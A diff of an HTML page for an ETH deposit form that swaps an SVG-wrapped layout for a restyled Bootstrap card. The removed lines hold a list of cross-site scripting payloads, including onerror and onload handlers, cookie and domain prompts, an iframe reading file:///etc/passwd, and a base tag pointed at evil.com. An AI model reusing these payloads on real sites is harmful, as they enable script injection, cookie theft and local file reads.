@@ -1,37 +1,79 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Deposit Form</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
+  <style>
+    body {
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #4f46e5, #9333ea);
+      font-family: 'Poppins', sans-serif;
+    }
+
+    .form-card {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+      width: 320px;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .form-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
+    }
+
+    .btn-glow {
+      background: linear-gradient(90deg, #4f46e5, #9333ea);
+      border: none;
+      color: white;
+      font-weight: 600;
+      transition: 0.3s ease;
+      box-shadow: 0 0 10px rgba(147, 51, 234, 0.5);
+    }
+
+    .btn-glow:hover {
+      box-shadow: 0 0 20px rgba(147, 51, 234, 0.8);
+      transform: scale(1.03);
+    }
+
+    h4 {
+      text-align: center;
+      color: #4f46e5;
+      font-weight: 700;
+      margin-bottom: 1.2rem;
+    }
+
+    .link {
+      display: block;
+      text-align: center;
+      margin-top: 1rem;
+      color: #9333ea;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
 <body>
-  <svg xmlns="http://www.w3.org/2000/svg" width="400" height="250">
-    <foreignObject width="100%" height="100%">
-      <html xmlns="http://www.w3.org/1999/xhtml">
-        <head>
-          <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
-        </head>
-        <body class="bg-light d-flex justify-content-center align-items-center h-100">
-          <form action="https://www.google.com" method="get" class="p-3 border rounded bg-white shadow-sm" style="min-width:250px;">
-            <h5 class="text-center mb-3">Deposit</h5>
-            <div class="mb-3">
-              <label class="form-label">Amount (ETH)</label>
-              <input type="number" class="form-control" placeholder="Enter amount"/>
-            </div>
-            <button type="submit" class="btn btn-primary w-100">Deposit</button>
-          </form>
-          <a href="javascript:print()">click here</a>
-          <h1 style="color:red">hello</h1>
-          <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-            "><img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
-"></script><img src=x onerror=prompt(document.domain)>
-"><img src=x onerror=prompt(window.cookie)>
-"><svg onx onload=prompt(123)>
-"><iframe src="file:///etc/passwd">
-"><object id="data" data="javascript:alert(123)" width="1000" height="1000">
-"><svg/onload=prompt(123)>@gmail.com
-"><base href=//evil.com>
-"><a href="javascript:alert(123)" onmouseover=prompt(1233)>Click Here</a>
-"><NOSCRIPT><p title="</NOSCRIPT><img src=x onerror=prompt(123)>">
-        </body>
-      </html>
-    </foreignObject>
-  </svg>
+  <form action="https://www.google.com" method="get" class="form-card">
+    <h4>💰 Deposit ETH</h4>
+    <div class="mb-3">
+      <label class="form-label">Amount (ETH)</label>
+      <input type="number" class="form-control" placeholder="Enter amount" required>
+    </div>
+    <button type="submit" class="btn btn-glow w-100 py-2">Deposit Now</button>
+    <a href="javascript:print()" class="link">🖨️ Print Receipt</a>
+  </form>
 </body>
 </html>
